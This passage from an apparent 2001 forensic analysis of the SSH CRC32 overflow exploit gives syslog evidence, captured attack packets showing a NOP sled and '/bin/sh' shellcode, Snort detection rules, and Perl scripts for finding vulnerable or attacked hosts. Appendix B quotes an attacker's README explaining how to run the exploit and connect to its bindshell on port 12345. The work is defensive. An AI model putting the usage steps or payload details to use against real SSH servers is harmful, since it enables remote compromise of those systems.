+Nov  1 18:48:15 victim sshd[9606]: log: Connection from 10.10.10.10 port 33393
+Nov  1 18:48:15 victim sshd[9605]: fatal: Local: Corrupted check bytes on input.
+Nov  1 18:48:15 victim sshd[9607]: log: Connection from 10.10.10.10 port 33394
+Nov  1 18:48:16 victim sshd[9608]: log: Connection from 10.10.10.10 port 33395
+Nov  1 18:48:16 victim sshd[9609]: log: Connection from 10.10.10.10 port 33396
+Nov  1 18:48:16 victim sshd[9610]: log: Connection from 10.10.10.10 port 33397
+Nov  1 18:48:17 victim sshd[9611]: log: Connection from 10.10.10.10 port 33398
+Nov  1 18:48:17 victim sshd[9611]: fatal: Local: Corrupted check bytes on input.
+Nov  1 18:48:17 victim sshd[9612]: log: Connection from 10.10.10.10 port 33399
+Nov  1 18:48:18 victim sshd[9613]: log: Connection from 10.10.10.10 port 33400
+Nov  1 18:48:18 victim sshd[9614]: log: Connection from 10.10.10.10 port 33401
+Nov  1 18:58:18 victim sshd[9614]: fatal: Timeout before authentication.
+ =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+One final point.  Note the last syslog entry.  The successful exploit
+causes an authentication attempt to pause while the shell code back
+door becomes active.  You can connect to the shell and do whatever you
+want.  Only problem is, the original SSH daemon will timeout when the
+authentication doesn't complete, and the shell will be terminated
+(this is true of SSH 1.2.31, OpenSSH, and probably all ssh-1.x
+versions.) This gives a window of ten minutes (at least with SSH.com
+1.2.31) before the listening shell's parent dies and another exploit
+attempt must be started.  (That is plenty of time to fully root the
+box eight ways from Sunday, unfortunately.)
+
+
+
+Network traffic
+===============
+
+Tcpdump was used to capture the two "attacks" shown above. (The tcpdump
+file "sshdx.dump", rather than the exploit itself, is available [11]
+for those wishing to tune their IDSs to detect signatures of this
+particular exploit. Use something like "tcpreplay" [12] if your IDS
+does not support tcpdump files, then tell your coders to write tcpdump
+import functions like Snort. ;)
+
+[NOTE:  The tcpdump file was obtained using Red Hat's screwed up
+libpcap, which includes the device name in the dump records.  This
+means that all utilities, like "ngrep", must be linked against
+Red Hat's stock libpcap in order to read this file.  I REALLY wish
+that Red Hat had worked with the folks who maintain libpcap and
+convinced them to support either dump format, or switch to adding
+the device name in the standard libpcap, instead of going their
+own way in what seems to be typical Linux fashion.  This *really*
+makes it hard to share tcpdump files between operating systems.]
+
+ =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+# tcpdump -s1500 -w sshdx.dump ip host 10.10.10.3 &
+ =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+It can readily be seen that multiple connections are made to the SSH
+daemon, and using "ngrep" [5], you can even spot the final connection
+and brute force attack which interjects the shell code:
+
+ =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+ . . .
+
+T 10.10.10.3:2222 -> 10.10.10.10:32957 [AP]
+  SSH-1.5-1.2.31.                                                       
+
+T 10.10.10.10:32957 -> 10.10.10.3:2222 [AP]
+  SSH-1.5-OpenSSH_2.2.0p1.                                              
+
+T 10.10.10.3:2222 -> 10.10.10.10:32957 [AP]
+  ............GA..@.......%....`..P.....D&..2.+7#...1!?..c.r).8.^.h.....
+  ..I..b6..9.f........N..0....:BAh@s.e...H......(.D2.Zg......#.......\.j
+  W...O$....6.......$...V..;...U.@Y.K2.p<\..o..?..l.........*.p.K<s..,..
+  .@7.wBBy......1.i..%".....G*g.G.t(......M........[.......J......<.    
+
+T 10.10.10.10:32957 -> 10.10.10.3:2222 [AP]
+  ............GA..@.....`G.Fg.g.!.i.}..........._.e....=../..6....;....)
+  T.....|c...#W.\wve.cy .n.....q.Sc....}..".N.G.w"....n.../#.....8x..&.Z
+  ....Q/.......8..                                                      
+
+T 10.10.10.3:2222 -> 10.10.10.10:32957 [AP]
+  .........4..                                                          
+
+T 10.10.10.10:32957 -> 10.10.10.3:2222 [A]
+  ..W...2.......2.......2.......2.......2.......2.......2.......2.......
+  2.......2.......2.......2.......2.......2.......2.......2.......2 ....
+  ..2!......2$......2%......2(......2)......2,......2-......20......21..
+  ....24......25......28......29......2<......2=......2@......2A......2D
+  ......2E......2H......2I......2L......2M......2P......2Q......2T......
+  2U......2X......2Y......2\......2]......2`......2a......2d......2e....
+  ..2h......2i......2l......2m......2p......2q......2t......2u......2x..
+  ....2y......2|......2}......2.......2.......2.......2.......2.......2.
+  ......2.......2.......2.......2.......2.......2.......2.......2.......
+  2.......2.......2.......2.......2.......2.......2.......2.......2.....
+  ..2.......2.......2.......2.......2.......2.......2.......2.......2...
+  ....2.......2.......2.......2.......2.......2.......2.......2.......2.
+  ......2.......2.......2.......2.......2.......2.......2.......2.......
+  2.......2.......2.......2.......2.......2.......2.......2.......2.....
+  ..2.......2.......2.......2.......2.......2.......3.......3.......3...
+  ....3.......3.......3.......3.......3.......3.......3.......3.......3.
+  ......3.......3.......3.......3.......3 ......3!......3$......3%......
+  3(......3)......3,......3-......30......31......34......35......38....
+  ..39......3<......3=......3@......3A......3D......3E......3H......3I..
+  ....3L......3M......3P......3Q......3T......3U......3X......3Y......3\
+  ......3]......3`......3a......3d........1...p}.@                      
+
+T 10.10.10.10:32957 -> 10.10.10.3:2222 [A]
+  ......3i......3l......3m......3p......3q......3t......3u......3x......
+  3y......3|......3}......3.......3.......3.......3.......3.......3.....
+  ..3.......3.......3.......3.......3.......3.......3.......3.......3...
+  ....3.......3.......3.......3.......3.......3.......3.......3.......3.
+  ......3.......3.......3.......3.......3.......3.......3.......3.......
+  3.......3.......3.......3.......3.......3.......3.......3.......3.....
+  ..3.......3.......3.......3.......3.......3.......3.......3.......3...
+  ....3.......3.......3.......3.......3.......3.......3.......3.......3.
+  ......3.......3.......3.......3.......3.......4.......4.......4.......
+  4.......4.......4.......4.......4.......4.......4.......4.......4.....
+  ..4.......4.......4.......4.......4 ......4!......4$......4%......4(..
+  ....4)......4,......4-......40......41......44......45......48......49
+  ......4<......4=......4@......4A......4D......4E......4H......4I......
+  4L......4M......4P......4Q......4T......4U......4X......4Y......4\....
+  ..4]......4`......4a......4d......4e......4h......4i......4l......4m..
+  ....4p......4q......4t......4u......4x......4y......4|......4}......4.
+  ......4.......4.......4.......4.......4.......4.......4.......4.......
+  4.......4.......4.......4.......4.......4.......4.......4.......4.....
+  ..4.......4.......4.......4.......4.......4.......4.......4.......4...
+  ....4.......4.......4.......4.......4.......4.......4.......4.......4.
+  ......4.......4.......4.......4.........1...p}.@                      
+
+ . . .
+
+T 10.10.10.10:32957 -> 10.10.10.3:2222 [A]
+  ......................................................................
+  ......................................................................
+  ......................................................................
+  ......................................................................
+  ......................................................................
+  ......................................................................
+  ......................................................................
+  ......................................................................
+  .....................1..f..1...C.].C.].K.M..M...1..E.Cf.].f.E.09.M..E.
+  .E..E.....M.....CC....C....1..?......A....^.u.1..F..E......M..U.......
+  ./bin/sh.h0h0h0, 7350, zip/TESO!......................................
+  ......................................................................
+  ......................................................................
+  ......................................................................
+  ......................................................................
+  ......................................................................
+  ......................................................................
+  ......................................................................
+  ......................................................................
+  ......................................................................
+  ........................................1...p}.@                      
+ =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+You can match (for this exploit binary) on the string "h0h0h0, 7350,
+zip/TESO!" [7] in the packet payload, as well as for the "/bin/sh"
+and NOP sled.  (Of course these, and other strings, may change or
+disappear in derivatives of the original source.)
+
+The following signatures were developed by Marty Roesch and Brian
+Caswell, for use with Snort v1.8 or higher [6].  
+
+ =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+alert tcp $EXTERNAL_NET any -> $HOME_NET 22     \
+    (msg:"EXPLOIT ssh CRC32 overflow /bin/sh";  \
+    flags:A+; content:"/bin/sh";                \
+    reference:bugtraq,2347; reference:cve,CVE-2001-0144; \
+    classtype:shellcode-detect;)
+
+alert tcp $EXTERNAL_NET any -> $HOME_NET 22     \
+    (msg:"EXPLOIT ssh CRC32 overflow filler";   \
+    flags:A+; content:"|00 00 00 00 00 00 00 00 00 00 00 00 00|"; \
+    reference:bugtraq,2347; reference:cve,CVE-2001-0144; \
+    classtype:shellcode-detect;)
+
+alert tcp $EXTERNAL_NET any -> $HOME_NET 22     \
+    (msg:"EXPLOIT ssh CRC32 overflow NOOP";     \
+    flags:A+; content:"|90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90|"; \
+    reference:bugtraq,2347; reference:cve,CVE-2001-0144; \
+    classtype:shellcode-detect;)
+
+alert tcp $EXTERNAL_NET any -> $HOME_NET 22 \
+    (msg:"EXPLOIT ssh CRC32 overflow";      \
+    flags:A+; content:"|00 01 57 00 00 00 18|"; offset:0; depth:7; \
+    content:"|FF FF FF FF 00 00|"; offset:8; depth:14;   \
+    reference:bugtraq,2347; reference:cve,CVE-2001-0144; \
+    classtype:shellcode-detect;)
+ =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+Identification of potentially vulnerable or exploited hosts
+===========================================================
+
+Two scanners exist to identify ssh servers and their versions: Jeremy
+Mates' scan_ssh.pl[8] and Niels Provos' ScanSSH scanner[9].  A script
+to take the results of a scan with scan_ssh.pl and produce a break
+report on SSH server version and potential vulnerability can be found
+in Appendix A.  You may need to update the script based on
+vulnerability information provided by the authors of various SSH
+servers to get accurate results.
+
+[NOTE: You are not necessarily vulnerable just because the banner
+shows a version string that is listed as "affected".  If the patches
+listed in the RAZOR advisory, e.g., are applied, or if you eliminate
+v1 and use v2 of the protocol exclusively, the server will not be
+vulnerable.]
+
+Russell Fulton also has published a script for processing Argus[10]
+logs, included below in Appendix C.
+
+
+Final Note
+==========
+
+Team TESO issued a public statement about this exploit on 11/8/2001.
+You can find it here:
+
+	http://www.team-teso.org/sshd_statement.php
+
+
+Credits
+=======
+
+Thanks to Cindy Jenkins of UW MCIS for recovery of the artifacts
+analyzed here, Marty Roesch and Brian Caswell for Snort signatures,
+Mike Hornung for vulnerability assessment scan data and patches to
+Jeremy Mates' scanner, Russell Fulton, Peter Van Epp, Simple Nomad,
+Rik Farrow, Dug Song, Paul Tatarsky, Markus Friedl, other unnamed
+individuals, and all the folks at SecurityFocus.com for their input.
+
+
+Dave Dittrich <dittrich@cac.washington.edu>
+http://staff.washington.edu/dittrich/
+
+
+
+References
+==========
+
+[1] Portable Linux Amazing CD (PLAC) v2.9.1pre2, by Fred Cohen
+    http://www.all.net/ForensiX/plac.html
+
+[2] Netcat, by der Hobbit
+    http://www.l0pht.com/~weld/netcat/
+
+[3] Reverse Engineer's Query Tool
+    http://packetstormsecurity.org/linux/reverse-engineering/reqt-0.7f.tar.gz
+
+[4] LiSt Open Files (lsof)
+    http://sunsite.securitycentralhq.com/mirrors/security/lsof/lsof.tar.gz
+
+[5] ngrep, by Jordan Ritter
+    http://www.packetfactory.net/projects/ngrep/
+
+[6] Snort, by Marty Roesch and a cast of thousands
+    http://www.snort.org/
+
+[7] 7350.org / 7350
+    http://www.7350.org/
+    http://www.team-teso.org/about.php  (see the bottom)
+
+[8] ssh_scan.pl, by Jeremy Mates
+    http://sial.org/code/perl/scripts/ssh_scan.pl.html
+
+[9] ScanSSH scanner by Niels Provos
+    http://www.monkey.org/~provos/scanssh/
+
+[10] Argus - A generic IP network transaction auditing tool
+    http://www.qosient.com/argus
+
+[11] tcpdump of attack traffic (using Red Hat's screwed up version of libpcap)
+    http://staff.washington.edu/dittrich/misc/sshdx.dump
+
+[12] tcpreplay
+    http://packages.debian.org/testing/net/tcpreplay.html
+
+
+Appendix A
+==========
+
+Script for producing a one level break report based on known
+vulnerability status of several SSH servers and versions.
+(NOTE: You may need to modify this script for it to be accurate,
+and to understand its limitations - You must read it before using
+it.)
+
+
+ =-=-=-=-=-=-=-=-=-=-=-=-=-=-  cut here -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+#!/usr/bin/perl
+#
+# ssh-report
+#
+# Dave Dittrich <dittrich@cac.washington.edu>
+# Thu Nov 15 06:28:02 PST 2001
+#
+# Process output of scans for SSH servers, with version identifying
+# information, into two level break report format by SSH version.
+#
+# This script operates on a list of scan results that look
+# like this:
+# 
+#   % cat scanresults
+#   10.0.0.1    beavertail.dept.foo.edu  SSH-1.5-1.2.31
+#   10.0.0.2    lumpysoup.dept.foo.edu   SSH-1.5-1.2.31
+#   10.0.0.3    marktwain.dept.foo.edu   SSH-1.99-OpenSSH_2.5.2p2
+#   10.0.0.4    junebug.dept.foo.edu     SSH-1.5-1.2.31
+#   10.0.0.10   calvin.dept.foo.edu      SSH-1.99-OpenSSH_2.5.2p2
+#   10.0.0.11   hobbes.dept.foo.edu      SSH-1.99-OpenSSH_2.1.1
+#   10.0.0.20   willow.dept.foo.edu      SSH-1.99-OpenSSH_2.9p2
+#   10.0.0.21   berry.dept.foo.edu       SSH-1.99-OpenSSH_2.9p2
+#   10.0.0.23   whimpy.dept.foo.edu      SSH-1.99-OpenSSH_2.9p2
+#
+# The resulting report (without the "-a" flag) will look like this:
+#
+#     % ssh-report < scanresults
+#     
+#     SSH-1.5-1.2.31 (affected)
+#       beavertail.dept.foo.edu(10.0.0.1)
+#       lumpysoup.dept.foo.edu(10.0.0.2)
+#       junebug.dept.foo.edu(10.0.0.4)
+#     
+#     
+#     SSH-1.99-OpenSSH_2.1.1 (affected)
+#       hobbes.dept.foo.edu(10.0.0.11)
+#      
+# By default, this script will only report on those systems that
+# are running potentially vulnerable SSH servers.  Use the "-a"
+# option to report on all servers.  Use "grep -v" to filter out
+# hosts *before* you run them through this reporting script.
+#
+# SSH servers are considered "affected" if they are known, by being
+# listed in one or more of the following references, to have the crc32
+# compensation attack detector vulnerability:
+#
+#     http://www.kb.cert.org/vuls/id/945216
+#     http://www.securityfocus.com/bid/2347/
+#     http://xforce.iss.net/alerts/advise100.php
+#     http://www.ssh.com/products/ssh/advisories/ssh1_crc-32.cfm
+#
+# You also may need to adjust the logic below to lump systems
+# into the "Unknown" category correctly (e.g., if your server
+# has a custom version string, access control, etc.)
+#
+# The list below of servers and potential vulnerability was derived by
+# summarizing existing versions on a set of production networks and
+# using the advisories and reference material listed above.  You
+# should update this list as new information is obtained, or if new
+# versions of the SSH server are found on your network.
+
+# Note -- According to Marcus Friedl:
+# 
+# > the rules are simpler:
+# > 
+# > 1) protocol 2 only
+# > 
+# > all
+# > 	SSH-2.0-*
+# > are not affected, since no protocol v1 is iisnvolved.
+# > 
+# > 2) protocol 1 und 2 support
+# > 
+# > since
+# > 	SSH-1.99-*
+# > supports both protocol versions, it gets more difficult.
+# > for the commercial server, you never know the version
+# > of the server that will be called for the fallback,
+# > you have to assume that all
+# > 	SSH-1.99-[23]*
+# > are affected, and
+# > 	SSH-1.99-OpenSSH[-_].x.y
+# > are affected for versions x.y < 2.3
+# > 
+# > 3) protocol 1 only
+# > 	SSH-1.5-OpenSSH[-_].x.y
+# > is affected versions x.y < 2.3
+# > 
+# > and the commercial versions.
+# > 
+# > 	SSH-1.5-1.2.2[456789]
+# > 	SSH-1.5-1.2.3[01]
+#
+# Based on this, the correct rules should be as follows (update your
+# own rules per the above if this list is not complete.)
+
+%affected = (
+'Unknown', 'unknown',
+'SSH-1.4-1.2.13', 'not affected',
+'SSH-1.4-1.2.14', 'not affected',
+'SSH-1.4-1.2.15', 'not affected',
+'SSH-1.4-1.2.16', 'not affected',
+'SSH-1.5-1.2.17', 'not affected',
+'SSH-1.5-1.2.18', 'not affected',
+'SSH-1.5-1.2.19', 'not affected',
+'SSH-1.5-1.2.20', 'not affected',
+'SSH-1.5-1.2.21', 'not affected',
+'SSH-1.5-1.2.22', 'not affected',
+'SSH-1.5-1.2.23', 'not affected',
+'SSH-1.5-1.2.24', 'affected',
+'SSH-1.5-1.2.25', 'affected',
+'SSH-1.5-1.2.26', 'affected',
+'SSH-1.5-1.2.27', 'affected',
+'SSH-1.5-1.2.28', 'affected',
+'SSH-1.5-1.2.29', 'affected',
+'SSH-1.5-1.2.30', 'affected',
+'SSH-1.5-1.2.31', 'affected',
+'SSH-1.5-1.2.31a', 'not affected',	# Custom version post-CORE advisory
+'SSH-1.5-1.2.32', 'not affected',
+'SSH-1.5-1.3.6', 'affected',
+'SSH-1.5-1.3.7', 'affected',
+'SSH-1.5-1.3.8', 'affected',
+'SSH-1.5-1.3.9', 'affected',
+'SSH-1.5-1.3.10', 'affected',	# F-Secure SSH versions prior to 1.3.11-2
+'SSH-1.5-Cisco-1.25', 'unknown',
+'SSH-1.5-OSU_1.5alpha1', 'unknown',
+'SSH-1.5-OpenSSH-1.2', 'affected',
+'SSH-1.5-OpenSSH-1.2.1', 'affected',
+'SSH-1.5-OpenSSH-1.2.2', 'affected',
+'SSH-1.5-OpenSSH-1.2.3', 'affected',
+'SSH-1.5-OpenSSH_2.5.1', 'not affected',
+'SSH-1.5-OpenSSH_2.5.1p1', 'not affected',
+'SSH-1.5-OpenSSH_2.9p1', 'not affected',
+'SSH-1.5-OpenSSH_2.9p2', 'not affected',
+'SSH-1.5-RemotelyAnywhere', 'not affected',
+'SSH-1.99-2.0.11', 'affected w/Version 1 fallback',
+'SSH-1.99-2.0.12', 'affected w/Version 1 fallback',
+'SSH-1.99-2.0.13', 'affected w/Version 1 fallback',
+'SSH-1.99-2.1.0.pl2', 'affected w/Version 1 fallback',
+'SSH-1.99-2.1.0', 'affected w/Version 1 fallback',
+'SSH-1.99-2.2.0', 'affected w/Version 1 fallback',
+'SSH-1.99-2.3.0', 'affected w/Version 1 fallback',
+'SSH-1.99-2.4.0', 'affected w/Version 1 fallback',
+'SSH-1.99-3.0.0', 'affected w/Version 1 fallback',
+'SSH-1.99-3.0.1', 'affected w/Version 1 fallback',
+'SSH-1.5-OpenSSH-2.1', 'affected',
+'SSH-1.5-OpenSSH_2.1.1', 'affected',
+'SSH-1.5-OpenSSH_2.2.0', 'affected',
+'SSH-1.5-OpenSSH_2.2.0p1', 'affected',
+'SSH-1.5-OpenSSH_2.3.0', 'not affected',
+'SSH-1.5-OpenSSH_2.3.0p1', 'not affected',
+'SSH-1.5-OpenSSH_2.5.1', 'not affected',
+'SSH-1.5-OpenSSH_2.5.1p1', 'not affected',
+'SSH-1.5-OpenSSH_2.5.1p2', 'not affected',
+'SSH-1.5-OpenSSH_2.5.2p2', 'not affected',
+'SSH-1.5-OpenSSH_2.9.9p2', 'not affected',
+'SSH-1.5-OpenSSH_2.9', 'not affected',
+'SSH-1.5-OpenSSH_2.9p1', 'not affected',
+'SSH-1.5-OpenSSH_2.9p2', 'not affected',
+'SSH-1.5-OpenSSH_3.0p1', 'not affected',
+'SSH-1.5-OpenSSH-2.1', 'affected',
+'SSH-1.99-OpenSSH_2.1.1', 'affected',
+'SSH-1.99-OpenSSH_2.2.0', 'affected',
+'SSH-1.99-OpenSSH_2.2.0p1', 'affected',
+'SSH-1.99-OpenSSH_2.3.0', 'not affected',
+'SSH-1.99-OpenSSH_2.3.0p1', 'not affected',
+'SSH-1.99-OpenSSH_2.5.1', 'not affected',
+'SSH-1.99-OpenSSH_2.5.1p1', 'not affected',
+'SSH-1.99-OpenSSH_2.5.1p2', 'not affected',
+'SSH-1.99-OpenSSH_2.5.2p2', 'not affected',
+'SSH-1.99-OpenSSH_2.9.9p2', 'not affected',
+'SSH-1.99-OpenSSH_2.9', 'not affected',
+'SSH-1.99-OpenSSH_2.9p1', 'not affected',
+'SSH-1.99-OpenSSH_2.9p2', 'not affected',
+'SSH-1.99-OpenSSH_3.0p1', 'not affected',
+);
+
+# Make SURE you read the code first.
+&IKnowWhatImDoing();
+
+$all++, shift(@ARGV) if $ARGV[0] eq "-a";
+
+while (<>) {
+	chop;
+	s/\s+/ /g;
+	($ip, $host, $version) = split(' ', $_);
+
+	# Adjust this to identify other strings reported
+	# by servers that have access restrictions, etc.
+	# in place and do not show a specific version number.
+	# They all fall under the category "Unknown" in this case.
+	$version = "Unknown"
+		if ($version eq "Couldn't" ||
+		    $version eq "Unknown" ||
+		    $version eq "You" ||
+		    $version eq "timeout");
+
+	$server{"$version:$ip"} = $host;
+}
+
+foreach $i (sort keys %server) {
+	($version,$ip) = split(":", $i);
+	next if (($version =~ m|SSH-2.0-|) ||
+		 ($affected{$version} eq "not affected") && ! $all);
+	printf("\n\n%s (%s)\n", $version, $affected{$version})
+		if ($curver ne $version);
+	$curver = $version;
+	print "  " . $server{$i} . "($ip)\n";
+}
+
+exit(0);
+
+sub IKnowWhatImDoing {
+	local $IKnowWhatImDoing = 0;
+
+	# Uncomment the following line to make this script work.
+	# $IKnowWhatImDoing++;
+        die "I told you to read the code first, didn't I?\n"
+		unless $IKnowWhatImDoing;
+        return;
+}
+ =-=-=-=-=-=-=-=-=-=-=-=-=-=-  cut here -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+Appendix B
+==========
+
+The following is a README file that is accompanying one version
+of the SSH crc32 exploit:
+
+---
+
+sh exploit demystified: info supplied by XXXXXXXXXXXXXXXXXXXXXXXXXXXX
+1. rename the exploit to filename: ssh
+2. type:export blah=loser
+3. Once u figured out the syntax, this is how the exploit works
+
+First stage is the brute force, if it quits while brute forcing and says
+stack not found means the ssh is not vunerable
+Note:This takes ages, if it brute forces for anything more than 45min >
+i suggest you cancel it
+Second stage:
+If brute force is successful it will mvoe on to the second stage
+it will try some values
+
+if the exploit shows this:
+and freezes on the dots, it means your in business
+
+exploiting...
+
+DO NOT CLOSE THE EXPLOIT
+Instead open another term and telnet to the hosts port 12345 for a
+bindshell remeber to append commands with ; eg: ls;
+
+
+
+If it tries all the values and fails, then u're outta business and it
+should drop u back to shell
+
+EOF
+p.s:from my experience i have found the openssh 1.5 to be utter shit in
+exploiting, the ssh 1.2.6-1.2.30 has a higher chance of success rate
+Last words:This exploit only works maybe 2/10 times so be patient.
+
+---
+
+
+Appendix C
+==========
+
+Russell Fulton published the following to the unisog@sans.org
+email list, based on information provided by Peter Van Epp.
+
+
+From r.fulton@auckland.ac.nz Thu Nov  8 12:38:15 2001
+Date: Mon, 5 Nov 2001 11:31:05 +1300 (NZDT)
+Subject: [unisog] Tool to find ssh attacks in argus logs
+From: Russell Fulton <r.fulton@auckland.ac.nz>
+To: unisog@sans.org, argus-info@lists.andrew.cmu.edu
+
+Greetings All,
+	     Here is a quick perl hack to scan archived argus[1] logs 
+for evidence of ssh attacks.  The current attack that we have seen 
+iterates an offset for the shell code and this script picks up the 
+repeated attempts.  The script is quite specific to this attack and 
+looks for ssh session within a quite narrow size range.
+
+It has been tested by Peter Van Epp (thanks Peter!) on real data and  
+picked up all know attacks that they had seen and outgoing attacks from 
+machine on the network that had already been compromised.  Peter also 
+modified the script to work with argus 1.8.x (see comments).
+
+This is a first cut at this problem.  If I get time I will modify this 
+(using stuff from my watcher scan detector script) to give real time 
+notification on attacks.
+
+[1]: Argus IP audit tool http://www.qosient.com
+
+Russell Fulton, Computer and Network Security Officer
+The University of Auckland,  New Zealand
+
+#!/usr/bin/perl
+
+my %ipn;
+
+$ENV{TZ} = 'UTC';
+
+
+# Assumes version 2.0 ra -- remove A switch if running with 1.8.x data
+
+if (! open(RA, "bin/ra -Ancr ".join(' ', @ARGV) .
+                     " - tcp and dst port 22 |") ) {
+        die "failed to open connection to server";
+}
+
+while(<RA>) {
+  chomp;
+  my ( $timestmp, $proto, $src,  $srcp, $sym, $dst,
+       $dstp, $topkt, $fpkt, $tobytes, $fbytes, $status) =
+	   unpack "A19x3A4a15xA6A3x2A16xA5xA8xA9xA12xA12a10", $_;
+# From Peter Van Epp:
+# If you are luditte like me and still running 1.8.1 comment out the 3 lines
+# above and uncomment the 5 lines below
+
+#  my ( $timestmp, $flag, $proto, $src,  $srcp, $sym, $dst,
+#       $dstp, $topkt, $fpkt, $tobytes, $fbytes, $status) =
+#           unpack "A18xA3xA4xA15xA6A3xA15xA5xA6xA6x2A9xA9A3", $_;
+#  $src =~ s/ //g;
+#  $dst =~ s/ //g;
+
+next unless ( $tobytes > 90000 and $tobytes < 110000 and
+	      $fbytes > 300 and $fbytes < 400);
+
+  if( ! exists $ipn{$src} ) {
+      $ipn {$src} = {};
+      $ipn {$src}->{COUNT} = 1;
+      $ipn {$src}->{TOTAL} = 0;
+      $ipn{$src}->{TIME} = $timestmp;
+#print "$ipn{$src}->{TIME}\n";
+      $ipn {$src}->{$dst} = 1;
+  };
+  if( ! exists $ipn{$src}->{$dst} ) {
+      $ipn {$src}->{COUNT}++;
+      $ipn {$src}->{$dst} = 1;
+  } else {
+      $ipn {$src}->{$dst}++;
+  }
+  $ipn {$src}->{TOTAL}++;
+  $ipn{$src}->{LTIME} = $timestmp;
+
+}
+print scalar keys %ipn, "\n";
+
+foreach my $ip (sort {$ipn{$b}->{TOTAL} <=> $ipn{$a}->{TOTAL}} keys 
+%ipn ) { 
+#   my $dn = gethostbyaddr(pack("C4",split(/\./,$ipn)),2) || '';
+#    last if $ipn{$ip}->{TOTAL} == 1;
+   print "$ip $ipn{$ip}->{TIME} -- $ipn{$ip}->{LTIME} # number of 
+targets $ipn{$ip}->{COUNT} total sessions $ipn{$ip}->{TOTAL}\n" ;
+}
